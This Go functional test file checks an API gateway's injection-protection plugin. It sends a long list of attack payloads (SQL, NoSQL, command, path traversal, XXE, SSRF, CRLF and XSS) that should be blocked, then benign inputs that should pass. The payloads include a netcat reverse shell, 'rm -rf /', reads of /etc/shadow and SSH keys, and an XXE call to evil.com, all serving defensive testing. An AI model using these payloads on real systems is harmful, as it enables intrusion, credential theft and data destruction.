package functional_test

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
)

func TestInjectionProtection_BlockAttacks(t *testing.T) {
	defer RunTest(t, "InjectionProtection", time.Now())()
	subdomain := fmt.Sprintf("injection-%d", time.Now().Unix())
	gatewayID := CreateGateway(t, map[string]interface{}{
		"name":      "Injection Protection Test Gateway",
		"subdomain": subdomain,
	})

	apiKey := CreateApiKey(t, gatewayID)

	upstreamID := CreateUpstream(t, gatewayID, map[string]interface{}{
		"name":      fmt.Sprintf("injection-upstream-%d", time.Now().Unix()),
		"algorithm": "round-robin",
		"targets": []map[string]interface{}{
			{
				"host":     "localhost",
				"port":     8081,
				"protocol": "http",
				"path":     "/__/ping",
				"weight":   100,
				"priority": 1,
			},
		},
	})

	serviceID := CreateService(t, gatewayID, map[string]interface{}{
		"name":        fmt.Sprintf("injection-service-%d", time.Now().Unix()),
		"type":        "upstream",
		"description": "Injection protection test service",
		"upstream_id": upstreamID,
	})

	rulePayload := map[string]interface{}{
		"name":       uuid.New().String(),
		"path":       "/injection-test",
		"service_id": serviceID,
		"methods":    []string{"GET", "POST"},
		"strip_path": true,
		"active":     true,
	}

	status, ruleResp := sendRequest(t, http.MethodPost, fmt.Sprintf("%s/gateways/%s/rules", AdminUrl, gatewayID), map[string]string{
		"Authorization": fmt.Sprintf("Bearer %s", AdminToken),
	}, rulePayload)
	assert.Equal(t, http.StatusCreated, status)
	ruleID, ok := ruleResp["id"].(string)
	assert.True(t, ok)
	assert.NotEmpty(t, ruleID)

	pluginPayload := map[string]interface{}{
		"type": "rule",
		"id":   ruleID,
		"plugins": []map[string]interface{}{
			{
				"name":     "injection_protection",
				"enabled":  true,
				"stage":    "pre_request",
				"priority": 1,
				"parallel": false,
				"settings": map[string]interface{}{
					"predefined_injections": []map[string]interface{}{
						{"type": "sql", "enabled": true},
						{"type": "nosql", "enabled": true},
						{"type": "command", "enabled": true},
						{"type": "path", "enabled": true},
						{"type": "ldap", "enabled": true},
						{"type": "xml", "enabled": true},
						{"type": "ssrf", "enabled": true},
						{"type": "file", "enabled": true},
						{"type": "template", "enabled": true},
						{"type": "xpath", "enabled": true},
						{"type": "header", "enabled": true},
						{"type": "xss", "enabled": true},
					},
					"content_to_check": []string{"headers", "path_and_query", "body"},
					"action":           "block",
					"status_code":      403,
					"error_message":    "Potential security threat detected",
				},
			},
		},
	}

	status, _ = sendRequest(t, http.MethodPost, fmt.Sprintf("%s/plugins", AdminUrl), map[string]string{
		"Authorization": fmt.Sprintf("Bearer %s", AdminToken),
	}, pluginPayload)
	assert.Equal(t, http.StatusNoContent, status)

	time.Sleep(500 * time.Millisecond)

	attackTests := []struct {
		name           string
		method         string
		path           string
		headers        map[string]string
		body           interface{}
		expectedStatus int
		attackType     string
	}{
		// SQL Injection variants
		{
			name:           "SQL Injection - DROP TABLE in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"query": "DROP TABLE users"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - Classic OR 1=1 in Query",
			method:         "GET",
			path:           "/injection-test?search=' OR '1'='1",
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - UNION SELECT in Header",
			method:         "GET",
			path:           "/injection-test",
			headers:        map[string]string{"X-User-Input": "UNION SELECT * FROM users"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - OR 1=1 in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"username": "' OR '1'='1' --"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - OR 1=1 numeric",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"id": "' OR 1=1 --"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - UNION ALL SELECT",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"query": "UNION ALL SELECT * FROM admin"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - SLEEP function",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"id": "1' AND SLEEP(5) --"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - BENCHMARK function",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"id": "1' AND BENCHMARK(5000000,MD5(1)) --"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - Stacked queries",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"query": "'; DELETE FROM users; --"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - TRUNCATE TABLE",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"action": "TRUNCATE TABLE logs"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - LIKE operator",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"search": "' OR 'a' LIKE 'a"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - CONVERT function",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"id": "1 AND 1=CONVERT(int, @@version)"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - SQL comments",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"query": "admin'/*comment*/--"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - ALTER TABLE",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"query": "ALTER TABLE users ADD COLUMN hacked VARCHAR(255)"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		{
			name:           "SQL Injection - CREATE TABLE",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"query": "CREATE TABLE backdoor (id INT)"},
			expectedStatus: 403,
			attackType:     "sql",
		},
		// NoSQL Injection variants
		{
			name:           "NoSQL Injection - $where",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"filter": map[string]interface{}{"$where": "this.password == this.username"}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $regex",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"username": map[string]interface{}{"$regex": ".*"}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $exists",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"admin": map[string]interface{}{"$exists": true}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $gt",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"age": map[string]interface{}{"$gt": 0}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $ne",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"role": map[string]interface{}{"$ne": "user"}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $nin",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"status": map[string]interface{}{"$nin": []string{"blocked"}}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $function",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"$function": "function() { return true; }"},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		{
			name:           "NoSQL Injection - $elemMatch",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]interface{}{"tags": map[string]interface{}{"$elemMatch": map[string]interface{}{"$gt": 0}}},
			expectedStatus: 403,
			attackType:     "nosql",
		},
		// Command Injection variants
		{
			name:           "Command Injection - semicolon",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"cmd": "ls; cat /etc/passwd"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - pipe",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"input": "test | cat /etc/passwd"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - system()",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"code": "system('rm -rf /')"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - exec()",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"code": "exec('cat /etc/passwd')"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - shell_exec()",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"code": "shell_exec('whoami')"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - netcat reverse shell",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"host": "nc -e /bin/sh 192.168.1.1 4444"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - python command",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"script": "python -c 'import os; os.system(\"id\")'"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - powershell",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"cmd": "powershell -c Invoke-Expression"},
			expectedStatus: 403,
			attackType:     "command",
		},
		{
			name:           "Command Injection - base64 encoded",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"data": "echo d2hvYW1p | base64 -d"},
			expectedStatus: 403,
			attackType:     "command",
		},
		// Path Traversal variants
		{
			name:           "Path Traversal - basic",
			method:         "GET",
			path:           "/injection-test?file=../../../etc/passwd",
			expectedStatus: 403,
			attackType:     "path",
		},
		{
			name:           "Path Traversal - encoded",
			method:         "GET",
			path:           "/injection-test?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
			expectedStatus: 403,
			attackType:     "path",
		},
		{
			name:           "Path Traversal - double encoded",
			method:         "GET",
			path:           "/injection-test?file=..%252f..%252f..%252fetc%252fpasswd",
			expectedStatus: 403,
			attackType:     "path",
		},
		{
			name:           "Path Traversal - with exec",
			method:         "GET",
			path:           "/injection-test?path=/bin/sh",
			expectedStatus: 403,
			attackType:     "path",
		},
		{
			name:           "Path Traversal - sensitive files",
			method:         "GET",
			path:           "/injection-test?file=../../etc/shadow",
			expectedStatus: 403,
			attackType:     "path",
		},
		{
			name:           "Path Traversal - ssh keys",
			method:         "GET",
			path:           "/injection-test?key=../../.ssh/id_rsa",
			expectedStatus: 403,
			attackType:     "path",
		},
		// LDAP Injection variants
		{
			name:           "LDAP Injection - OR operator",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"username": "admin)(&(password=*))"},
			expectedStatus: 403,
			attackType:     "ldap",
		},
		{
			name:           "LDAP Injection - AND operator",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"filter": "(&(cn=*)(userPassword=*))"},
			expectedStatus: 403,
			attackType:     "ldap",
		},
		{
			name:           "LDAP Injection - NOT operator",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"filter": "(!(cn=admin))"},
			expectedStatus: 403,
			attackType:     "ldap",
		},
		{
			name:           "LDAP Injection - wildcard",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"search": "cn=*admin*"},
			expectedStatus: 403,
			attackType:     "ldap",
		},
		{
			name:           "LDAP Injection - nested",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"filter": "(|(cn=*)(&(objectClass=*)))"},
			expectedStatus: 403,
			attackType:     "ldap",
		},
		// XML Injection variants
		{
			name:           "XML Injection - XXE ENTITY",
			method:         "POST",
			path:           "/injection-test",
			body:           "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
			expectedStatus: 403,
			attackType:     "xml",
		},
		{
			name:           "XML Injection - DOCTYPE",
			method:         "POST",
			path:           "/injection-test",
			body:           "<!DOCTYPE root SYSTEM \"file:///etc/passwd\">",
			expectedStatus: 403,
			attackType:     "xml",
		},
		{
			name:           "XML Injection - ELEMENT",
			method:         "POST",
			path:           "/injection-test",
			body:           "<!ELEMENT root ANY>",
			expectedStatus: 403,
			attackType:     "xml",
		},
		{
			name:           "XML Injection - CDATA",
			method:         "POST",
			path:           "/injection-test",
			body:           "<![CDATA[<script>alert(1)</script>]]>",
			expectedStatus: 403,
			attackType:     "xml",
		},
		{
			name:           "XML Injection - SYSTEM",
			method:         "POST",
			path:           "/injection-test",
			body:           "<!ENTITY ext SYSTEM \"http://evil.com/evil.dtd\">",
			expectedStatus: 403,
			attackType:     "xml",
		},
		{
			name:           "XML Injection - PUBLIC",
			method:         "POST",
			path:           "/injection-test",
			body:           "<!ENTITY ext PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://evil.com/evil.dtd\">",
			expectedStatus: 403,
			attackType:     "xml",
		},
		{
			name:           "XML Injection - XInclude",
			method:         "POST",
			path:           "/injection-test",
			body:           "<xi:include href=\"file:///etc/passwd\"/>",
			expectedStatus: 403,
			attackType:     "xml",
		},
		// SSRF variants
		{
			name:           "SSRF - file protocol",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "file:///etc/passwd"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - gopher protocol",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "gopher://127.0.0.1:6379"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - dict protocol",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "dict://127.0.0.1:11211"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - localhost",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "http://localhost:8080/admin"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - 127.0.0.1",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "http://127.0.0.1:8080"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - metadata endpoint",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "http://169.254.169.254/latest/meta-data"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - cloud metadata",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "http://metadata.google.internal"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		{
			name:           "SSRF - php protocol",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "php://filter/read=string.rot13/resource=index.php"},
			expectedStatus: 403,
			attackType:     "ssrf",
		},
		// File Inclusion variants
		{
			name:           "File Inclusion - LFI",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"include": "../../../etc/passwd"},
			expectedStatus: 403,
			attackType:     "file",
		},
		{
			name:           "File Inclusion - include_once",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"file": "include_once('../../../etc/passwd')"},
			expectedStatus: 403,
			attackType:     "file",
		},
		{
			name:           "File Inclusion - require",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"file": "require('../../../etc/passwd')"},
			expectedStatus: 403,
			attackType:     "file",
		},
		{
			name:           "File Inclusion - php filter",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"file": "php://filter/read=string.rot13/resource=index.php"},
			expectedStatus: 403,
			attackType:     "file",
		},
		{
			name:           "File Inclusion - php input",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"file": "php://input"},
			expectedStatus: 403,
			attackType:     "file",
		},
		{
			name:           "File Inclusion - sensitive files",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"file": "/etc/shadow"},
			expectedStatus: 403,
			attackType:     "file",
		},
		{
			name:           "File Inclusion - null byte",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"file": "file.php%00.jpg"},
			expectedStatus: 403,
			attackType:     "file",
		},
		// Template Injection variants
		{
			name:           "Template Injection - Jinja2",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"template": "{{7*7}}"},
			expectedStatus: 403,
			attackType:     "template",
		},
		{
			name:           "Template Injection - Handlebars",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"template": "{{#if 7*7}}49{{/if}}"},
			expectedStatus: 403,
			attackType:     "template",
		},
		{
			name:           "Template Injection - ERB",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"template": "<%= 7*7 %>"},
			expectedStatus: 403,
			attackType:     "template",
		},
		{
			name:           "Template Injection - Smarty",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"template": "{7*7}"},
			expectedStatus: 403,
			attackType:     "template",
		},
		{
			name:           "Template Injection - Twig",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"template": "{{7*'7'}}"},
			expectedStatus: 403,
			attackType:     "template",
		},
		{
			name:           "Template Injection - prototype",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"obj": "__proto__"},
			expectedStatus: 403,
			attackType:     "template",
		},
		{
			name:           "Template Injection - constructor",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"obj": "constructor"},
			expectedStatus: 403,
			attackType:     "template",
		},
		// XPath Injection variants
		{
			name:           "XPath Injection - contains",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"xpath": "//*[contains(@name, 'admin')]"},
			expectedStatus: 403,
			attackType:     "xpath",
		},
		{
			name:           "XPath Injection - wildcard",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"xpath": "//*[@*]"},
			expectedStatus: 403,
			attackType:     "xpath",
		},
		{
			name:           "XPath Injection - substring",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"xpath": "substring(//user[@id=1]/name, 1, 10)"},
			expectedStatus: 403,
			attackType:     "xpath",
		},
		{
			name:           "XPath Injection - concat",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"xpath": "concat('admin', 'user')"},
			expectedStatus: 403,
			attackType:     "xpath",
		},
		{
			name:           "XPath Injection - count",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"xpath": "count(//user)"},
			expectedStatus: 403,
			attackType:     "xpath",
		},
		// Header Injection variants (tested in body since HTTP client doesn't allow CRLF in headers)
		{
			name:           "Header Injection - CRLF Location in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"header": "evil.com\r\nLocation: http://evil.com"},
			expectedStatus: 403,
			attackType:     "header",
		},
		{
			name:           "Header Injection - CRLF Set-Cookie in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"userAgent": "test\r\nSet-Cookie: sessionid=stolen"},
			expectedStatus: 403,
			attackType:     "header",
		},
		{
			name:           "Header Injection - HTTP response in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"header": "test\r\nHTTP/1.1 200 OK"},
			expectedStatus: 403,
			attackType:     "header",
		},
		{
			name:           "Header Injection - Content-Type in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"input": "test\r\nContent-Type: text/html"},
			expectedStatus: 403,
			attackType:     "header",
		},
		{
			name:           "Header Injection - X-Forwarded-For in Body",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"forwarded": "127.0.0.1\r\nX-Real-IP: 192.168.1.1"},
			expectedStatus: 403,
			attackType:     "header",
		},
		{
			name:           "Header Injection - X-Forwarded-Host in Query",
			method:         "GET",
			path:           "/injection-test?host=evil.com%0D%0ALocation:%20http://evil.com",
			expectedStatus: 403,
			attackType:     "header",
		},
		{
			name:           "Header Injection - Set-Cookie in Query",
			method:         "GET",
			path:           "/injection-test?ua=test%0D%0ASet-Cookie:%20sessionid=stolen",
			expectedStatus: 403,
			attackType:     "header",
		},
		// XSS variants
		{
			name:           "XSS - script tag",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"comment": "<script>alert('XSS')</script>"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - img tag",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"comment": "<img src=x onerror=alert(1)>"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - event handler",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"input": "test\" onmouseover=\"alert(1)\""},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - javascript protocol",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "javascript:alert('XSS')"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - alert function",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"code": "alert('XSS')"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - eval function",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"code": "eval('alert(1)')"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - iframe",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"content": "<iframe src=\"javascript:alert(1)\"></iframe>"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - object tag",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"content": "<object data=\"javascript:alert(1)\"></object>"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - data URI",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"url": "data:text/javascript,alert(1)"},
			expectedStatus: 403,
			attackType:     "xss",
		},
		{
			name:           "XSS - expression",
			method:         "POST",
			path:           "/injection-test",
			body:           map[string]string{"style": "expression(alert(1))"},
			expectedStatus: 403,
			attackType:     "xss",
		},
	}

	for _, tt := range attackTests {
		t.Run(tt.name, func(t *testing.T) {
			var reqBody io.Reader
			if tt.body != nil {
				switch v := tt.body.(type) {
				case string:
					reqBody = strings.NewReader(v)
				default:
					bodyBytes, err := json.Marshal(tt.body)
					assert.NoError(t, err)
					reqBody = bytes.NewBuffer(bodyBytes)
				}
			}

			url := ProxyUrl + tt.path
			req, err := http.NewRequest(tt.method, url, reqBody)
			assert.NoError(t, err)

			req.Header.Set("X-TG-API-Key", apiKey)
			if tt.body != nil {
				if _, isString := tt.body.(string); !isString {
					req.Header.Set("Content-Type", "application/json")
				} else {
					req.Header.Set("Content-Type", "application/xml")
				}
			}
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			resp, err := http.DefaultClient.Do(req)
			assert.NoError(t, err)
			defer func() { _ = resp.Body.Close() }()

			assert.Equal(t, tt.expectedStatus, resp.StatusCode,
				"Expected attack type %s to be blocked with status %d, got %d",
				tt.attackType, tt.expectedStatus, resp.StatusCode)

			if resp.StatusCode == 403 {
				var errorResp map[string]interface{}
				err := json.NewDecoder(resp.Body).Decode(&errorResp)
				if err == nil {
					if msg, ok := errorResp["error"].(string); ok {
						assert.Contains(t, msg, "security threat", "Error message should mention security threat")
					}
				}
			}
		})
	}
}

func TestInjectionProtection_AllowSafeInputs(t *testing.T) {
	defer RunTest(t, "InjectionProtection", time.Now())()
	subdomain := fmt.Sprintf("injection-safe-%d", time.Now().Unix())
	gatewayID := CreateGateway(t, map[string]interface{}{
		"name":      "Injection Protection Safe Test Gateway",
		"subdomain": subdomain,
	})

	apiKey := CreateApiKey(t, gatewayID)

	upstreamID := CreateUpstream(t, gatewayID, map[string]interface{}{
		"name":      fmt.Sprintf("injection-safe-upstream-%d", time.Now().Unix()),
		"algorithm": "round-robin",
		"targets": []map[string]interface{}{
			{
				"host":     "localhost",
				"port":     8081,
				"protocol": "http",
				"path":     "/__/ping",
				"weight":   100,
				"priority": 1,
			},
		},
	})

	serviceID := CreateService(t, gatewayID, map[string]interface{}{
		"name":        fmt.Sprintf("injection-safe-service-%d", time.Now().Unix()),
		"type":        "upstream",
		"description": "Injection protection safe test service",
		"upstream_id": upstreamID,
	})

	rulePayload := map[string]interface{}{
		"name":       uuid.New().String(),
		"path":       "/injection-safe-test",
		"service_id": serviceID,
		"methods":    []string{"GET", "POST"},
		"strip_path": true,
		"active":     true,
	}

	status, ruleResp := sendRequest(t, http.MethodPost, fmt.Sprintf("%s/gateways/%s/rules", AdminUrl, gatewayID), map[string]string{
		"Authorization": fmt.Sprintf("Bearer %s", AdminToken),
	}, rulePayload)
	assert.Equal(t, http.StatusCreated, status)
	ruleID, ok := ruleResp["id"].(string)
	assert.True(t, ok)
	assert.NotEmpty(t, ruleID)

	pluginPayload := map[string]interface{}{
		"type": "rule",
		"id":   ruleID,
		"plugins": []map[string]interface{}{
			{
				"name":     "injection_protection",
				"enabled":  true,
				"stage":    "pre_request",
				"priority": 1,
				"parallel": false,
				"settings": map[string]interface{}{
					"predefined_injections": []map[string]interface{}{
						{"type": "sql", "enabled": true},
						{"type": "nosql", "enabled": true},
						{"type": "command", "enabled": true},
						{"type": "path", "enabled": true},
						{"type": "ldap", "enabled": true},
						{"type": "xml", "enabled": true},
						{"type": "ssrf", "enabled": true},
						{"type": "file", "enabled": true},
						{"type": "template", "enabled": true},
						{"type": "xpath", "enabled": true},
						{"type": "header", "enabled": true},
						{"type": "xss", "enabled": true},
					},
					"content_to_check": []string{"headers", "path_and_query", "body"},
					"action":           "block",
					"status_code":      403,
					"error_message":    "Potential security threat detected",
				},
			},
		},
	}

	status, _ = sendRequest(t, http.MethodPost, fmt.Sprintf("%s/plugins", AdminUrl), map[string]string{
		"Authorization": fmt.Sprintf("Bearer %s", AdminToken),
	}, pluginPayload)
	assert.Equal(t, http.StatusNoContent, status)

	time.Sleep(500 * time.Millisecond)

	safeInputTests := []struct {
		name           string
		method         string
		path           string
		headers        map[string]string
		body           interface{}
		expectedStatus int
		description    string
	}{
		{
			name:           "Normal JSON Body",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]string{"message": "This is a safe message", "user": "john_doe"},
			expectedStatus: 200,
			description:    "Normal JSON payload should not be blocked",
		},
		{
			name:           "Normal Query Parameters",
			method:         "GET",
			path:           "/injection-safe-test?page=1&limit=10&sort=name",
			expectedStatus: 200,
			description:    "Normal query parameters should not be blocked",
		},
		{
			name:           "Normal Headers",
			method:         "GET",
			path:           "/injection-safe-test",
			headers:        map[string]string{"X-Request-ID": "12345", "User-Agent": "Mozilla/5.0"},
			expectedStatus: 200,
			description:    "Normal headers should not be blocked",
		},
		{
			name:           "Text with SQL-like words",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]string{"description": "The user selected items from the catalog"},
			expectedStatus: 200,
			description:    "Text containing SQL keywords in normal context should not be blocked",
		},
		{
			name:           "URLs in body",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]string{"website": "https://example.com/path/to/resource"},
			expectedStatus: 200,
			description:    "Normal URLs should not be blocked",
		},
		{
			name:           "File paths in normal context",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]string{"filepath": "/home/user/documents/file.txt"},
			expectedStatus: 200,
			description:    "Normal file paths should not be blocked",
		},
		{
			name:           "Template-like text",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]string{"text": "The price is $100 and the discount is 20%"},
			expectedStatus: 200,
			description:    "Text with dollar signs and percentages in normal context should not be blocked",
		},
		{
			name:   "Complex JSON structure",
			method: "POST",
			path:   "/injection-safe-test",
			body: map[string]interface{}{
				"user": map[string]interface{}{
					"name":  "John Doe",
					"email": "john@example.com",
					"age":   30,
				},
				"preferences": []string{"dark_mode", "notifications"},
			},
			expectedStatus: 200,
			description:    "Complex nested JSON structures should not be blocked",
		},
		{
			name:           "Numbers and operators",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]interface{}{"price": 100, "discount": 0.2, "total": 80},
			expectedStatus: 200,
			description:    "Numbers and mathematical operators in JSON should not be blocked",
		},
		{
			name:           "Special characters in safe context",
			method:         "POST",
			path:           "/injection-safe-test",
			body:           map[string]string{"comment": "This is a comment with special chars: @#$%^&*()"},
			expectedStatus: 200,
			description:    "Special characters in normal text should not be blocked",
		},
	}

	for _, tt := range safeInputTests {
		t.Run(tt.name, func(t *testing.T) {
			var reqBody io.Reader
			if tt.body != nil {
				switch v := tt.body.(type) {
				case string:
					reqBody = strings.NewReader(v)
				default:
					bodyBytes, err := json.Marshal(tt.body)
					assert.NoError(t, err)
					reqBody = bytes.NewBuffer(bodyBytes)
				}
			}

			url := ProxyUrl + tt.path
			req, err := http.NewRequest(tt.method, url, reqBody)
			assert.NoError(t, err)

			req.Header.Set("X-TG-API-Key", apiKey)
			if tt.body != nil {
				if _, isString := tt.body.(string); !isString {
					req.Header.Set("Content-Type", "application/json")
				}
			}
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			resp, err := http.DefaultClient.Do(req)
			assert.NoError(t, err)
			defer func() { _ = resp.Body.Close() }()

			assert.Equal(t, tt.expectedStatus, resp.StatusCode,
				"%s: Expected status %d, got %d. %s",
				tt.name, tt.expectedStatus, resp.StatusCode, tt.description)

			if resp.StatusCode == 403 {
				var errorResp map[string]interface{}
				err := json.NewDecoder(resp.Body).Decode(&errorResp)
				if err == nil {
					t.Logf("❌ False positive detected for: %s - %s", tt.name, tt.description)
					if msg, ok := errorResp["error"].(string); ok {
						t.Logf("   Error message: %s", msg)
					}
				}
			} else {
				t.Logf("✅ Safe input allowed: %s", tt.name)
			}
		})
	}
}
